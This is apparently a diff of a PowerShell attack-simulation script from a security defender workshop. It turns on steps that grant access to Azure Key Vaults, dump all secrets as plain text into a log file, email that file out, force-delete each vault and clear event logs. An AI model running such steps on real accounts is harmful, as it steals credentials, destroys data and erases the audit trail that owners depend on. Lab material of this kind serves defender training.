@@ -5,10 +5,12 @@ function ExportSecrets()
 
     foreach($v in $vaults)
     {
+        Set-AzKeyVaultAccessPolicy -ResourceGroupName $v.ResourceGroupName -VaultName $v.VaultName -UserPrincipalName '#USERNAME#' -PermissionsToSecrets set,delete,get,list
+
         #export all keys
         $secrets = Get-AzKeyVaultSecret -VaultName $v.VaultName;
     
-        foreach($s in secrets)
+        foreach($s in $secrets)
         {
             $secretText = Get-AzKeyVaultSecret -VaultName $v.VaultName -Name $s.Name -AsPlainText;
     
@@ -17,8 +19,8 @@ function ExportSecrets()
             add-content "secrets.log" $line;
         }
     
-        #delete it...
-        #Remove-AzKeyVault $v
+        #delete it...muahahahah
+        Remove-AzKeyVault -ResourceGroupName $v.ResourceGroupName -VaultName $v.VaultName -Force;
     }    
 }
 
@@ -46,13 +48,15 @@ function Send()
     Send-MailMessage @mailParams -Attachments $filepath1;
 
     #move over the logs
+    MoveLogs;
 
     #clear event logs
+    clear-all-event-logs;
 }
 
 function MoveLogs()
 {
-    $path = "C:\github\solliancenet\security-defender-workshop-400\artifacts\day-02";
+    $path = "C:\github\solliancenet\#WORKSHOP_NAME#\artifacts\day-02";
 
     copy-item -path "$path\logs-03\logs-05.log" "c:\logs";
 
@@ -66,14 +70,12 @@ function clear-all-event-logs ($computerName="localhost")
    Get-EventLog -ComputerName $computername -list
 }
 
-#Connect-AzAccount;
+$password = ConvertTo-SecureString -AsPlainText #PASSWORD# -Force;
 
-#Set-AzContext -Subscription e433f371-e5e9-4238-abc2-7c38aa596a18;
+$credential = new-object -typename System.Management.Automation.PSCredential -argumentlist #USERNAME#, $password;
+
+Connect-AzAccount -Credential $credential;
 
 ExportSecrets;
 
-Send
-
-MoveLogs
-
-clear-all-event-logs
+Send;
